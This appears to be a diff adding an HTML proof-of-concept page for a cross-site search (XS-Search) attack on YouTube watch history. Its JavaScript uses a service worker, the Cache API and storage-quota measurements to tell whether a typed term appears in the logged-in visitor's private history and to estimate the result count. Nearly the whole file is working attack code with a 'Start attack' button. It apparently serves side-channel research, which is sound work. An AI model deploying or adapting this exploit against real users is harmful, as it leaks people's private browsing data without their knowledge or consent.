@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>XS-Search</title>
+
+  <script>
+
+var logString = "";
+
+String.prototype.replaceAll = function(search, replace)
+{
+    //if replace is null, return original string otherwise it will
+    //replace search string with 'undefined'.
+    if(!replace) 
+        return this;
+
+    return this.replace(new RegExp('[' + search + ']', 'g'), replace);
+};
+
+function addToLogString(logStr)
+{
+	logString += logStr;
+	var ddd = document.createElement("div");
+	ddd.innerHTML = logStr.replaceAll("\n","<br>")
+	document.body.appendChild(ddd);
+}
+  
+var CACHE_NAME = 'CACHE';
+  
+function randomString(len)
+{
+    text = "";
+    possible = "abcdefghijklmnopqrstuvwxyz";
+	numberOfCharacters = possible.length;
+	
+    for( var i=0; i < len; i++ )
+        text += possible.charAt(Math.floor(Math.random() * numberOfCharacters));
+
+    return text;
+}
+
+
+function takeSecondSizeMeasurement() {
+	navigator.webkitTemporaryStorage.queryUsageAndQuota(function(quota, usage) {
+		secondSizeMeasurement = quota;
+		tempSize = secondSizeMeasurement - firstSizeMeasurement;
+		firstSizeMeasurement = secondSizeMeasurement;
+
+		console.log([tempSize, secondSizeMeasurement, firstSizeMeasurement]);
+		
+		if (dummyMeasurement)
+		{
+			if (tempSize != 0)
+			{
+				dummyMeasurement = false;	
+			}
+			measureSize();
+			return;
+		}
+		else if (tempSize == 0)// || (currentSetIndex > 0 && 1.95*Math.max.apply(null, namesRequestsDuration[currentSetIndex - 1]) + 5000 < tempSize))
+		{
+			dummyMeasurement = true;
+			measureSize();
+			return;
+		}
+		else
+		{
+			measurements.push(tempSize);
+			if (measurements.length == 2)
+			{
+				finishAttack();
+			}
+			else
+			{
+				url = dummyReq;
+				measureSize();
+			}	
+		}
+	});
+}
+
+
+var firstSizeMeasurement;
+var secondSizeMeasurement;
+
+async function getResponses(cachesKeys) {
+	for (let i = 0; i < cachesKeys.length; i++) {
+		let response = await caches.match(cachesKeys[i])
+		responses.push(response.clone())
+	}
+}
+
+function measureSize() 
+{
+	caches.match(new Request(url, {mode: 'no-cors', include: 'credentials'})).then(function(resp) {
+		if (resp == null) return;
+		caches.open(CACHE_NAME).then(function(cache){
+			cache.put(new Request("" + randStr + counter++, {mode: 'no-cors', include: 'credentials'}), resp.clone()).then(function(){
+				takeSecondSizeMeasurement();
+			});
+		});
+	});
+}
+
+function registerWorker()
+{
+	navigator.serviceWorker.register('k2.js').then(function(registration) {
+		// Registration was successful
+		console.log('ServiceWorker registration successful with scope: ',    registration.scope);
+		if (navigator.serviceWorker.controller) {
+			console.log('The service worker is currently handling network operations.');
+			document.getElementById("startButton").hidden = false;
+		} else {
+			console.log('Please reload this page to allow the service worker to handle network operations.');
+			if (document.location.search == "")
+				document.location.replace(document.location.href + "?0");
+				
+			return;
+		}		
+	}).catch(function(err) {
+		// registration failed :(
+		console.log('ServiceWorker registration failed: ', err);
+	});
+}
+
+function forceCacheUrls(requests) {
+	//updateStatus('Start downloading resources');
+	return new Promise(function(resolve) {
+		var messageChannel = new MessageChannel();
+		messageChannel.port1.onmessage = function(event) {
+			resolve();
+		};
+		navigator.serviceWorker.controller.postMessage({"action": "cacheAll", "requests": requests}, [messageChannel.port2]);
+	});
+}
+
+function forceCacheUrlsNoCred(urls) {
+	//updateStatus('Start downloading resources');
+	return new Promise(function(resolve) {
+		var messageChannel = new MessageChannel();
+		messageChannel.port1.onmessage = function(event) {
+			resolve();
+		};
+		navigator.serviceWorker.controller.postMessage({"action": "cacheAllNoCredentials", "urls": urls}, [messageChannel.port2]);
+	});
+}
+
+async function deleteCacheAndResponses() {
+	await deleteCache()
+	responses = []
+}
+
+async function deleteCache() {
+	await caches.delete(CACHE_NAME)
+}
+
+async function putInCache(key, value) {
+	let cache = await caches.open(CACHE_NAME)
+	await cache.put(key, value)
+}
+
+async function getUsageAndQuota() {
+	return new Promise((resolve) => {
+		navigator.webkitTemporaryStorage.queryUsageAndQuota(function(usage, quota) {
+			resolve(usage)
+		})
+	})
+}
+
+async function startMeasure(responses) {
+	let lastMeasurement
+	for (let i = 0; i < responses.length; i++) {
+		let measurement = await measure(responses[i])
+			
+		if (lastMeasurement !== undefined) {
+			let absoluteMeasurement = Math.abs(measurement - lastMeasurement)
+			//printMeasure(absoluteMeasurement)
+			//measures.push(absoluteMeasurement)
+			measures1.push(measurement)
+			measures.push(lastMeasurement)
+		}
+		
+		lastMeasurement = measurement
+	}
+}
+
+function printMeasure(measurement) {
+	var str;
+	attackTime = performance.now() - attackStartTime;
+	var estimatedDiffPerResult = 5300;
+	console.log(`Difference is: ${Math.abs(measurement)}`)
+	if (measurement > diffThreshold)
+	{
+		var estimatedResultsCounter = Math.min(Math.round(measurement/estimatedDiffPerResult),20);
+		str = "There is at least one result for the tested search request.";
+		str += "<br>The estimated number of search results: " + estimatedResultsCounter;
+	}
+	else
+	{
+		str = "No search results were received for this search request.";
+	}
+	str += "<br>Attack was completed within " + (attackTime/1000) + " seconds";
+	document.getElementById("resultsDiv").innerHTML = str;
+}
+
+async function measure(data) {
+	await putInCache('measure', data)
+	return await getUsageAndQuota()
+}
+
+async function startAttack()
+{
+	measurements = [];
+	dummyMeasurement = false;
+	randStr = randomString(5);
+	counter = 0;
+	attackStartTime = performance.now();
+	var basicReq = "https://www.youtube.com/feed/history?query=";
+	var query = encodeURI(document.getElementById("wordText").value);
+	let requestUrl = basicReq + query
+	challengeReq = {
+		url: requestUrl, 
+		properties: {mode: 'no-cors', credentials: 'same-origin', cache: 'no-store'},
+		cacheKey: 'challenge'
+	}
+	dummyReq = {
+		url: requestUrl, 
+		properties: {mode: 'no-cors', credentials: 'omit', cache: 'no-store'},
+		cacheKey: 'dummy'
+	}
+	attackStartTime = performance.now();
+	stopIndex = 0;
+	for (let i = 0; i < 3; i++) {
+		await forceCacheUrls([challengeReq, dummyReq])
+		await getResponses([challengeReq.cacheKey, dummyReq.cacheKey])
+		await deleteCache()
+		await startMeasure(responses)
+		await deleteCacheAndResponses()
+	}
+	
+	let dummyAvg = 0
+	measures.forEach((measure) => {
+		dummyAvg += measure
+	})
+	dummyAvg = dummyAvg / measures.length
+	
+	let realAvg = 0
+	measures1.forEach((measure) => {
+		realAvg += measure
+	})
+	realAvg = realAvg / measures1.length
+	
+	printMeasure(Math.abs(realAvg - dummyAvg))
+	measures = []
+	measures1 = []
+	//console.log(`Average is: ${sum / measures.length}`)
+}
+
+var dummyReq;
+var challengeReq;
+var diffThreshold = 4000;
+var url;
+var responses = [];
+var stopIndex = 0;
+var valueToStop = 2;
+var measures = []
+var measures1 = []
+document.addEventListener("keyup", (event) => {
+  // Number 13 is the "Enter" key on the keyboard
+  if (event.keyCode === 13) {
+    startAttack()
+  }
+});
+
+</script>
+
+</head>
+
+<body onload="registerWorker();">
+<h1>Welcome to LB XS-Search attack demo</h1>
+<h2>Use this form to cross-site search in Youtube watch history</h2>
+
+Type words/terms to test whether or not they appear in the watch history of the currently logged-in Youtube user:
+<br><input type="text" name="wordText" id="wordText" style="width:520px;" /><br>
+(You can use the OR operator for more complex queries)
+<br>
+<input type="button" id="startButton" value="Start attack" onclick="startAttack();" hidden="true" />
+<br>
+<br>
+<div id="resultsDiv"></div>
+</body>
+</html>
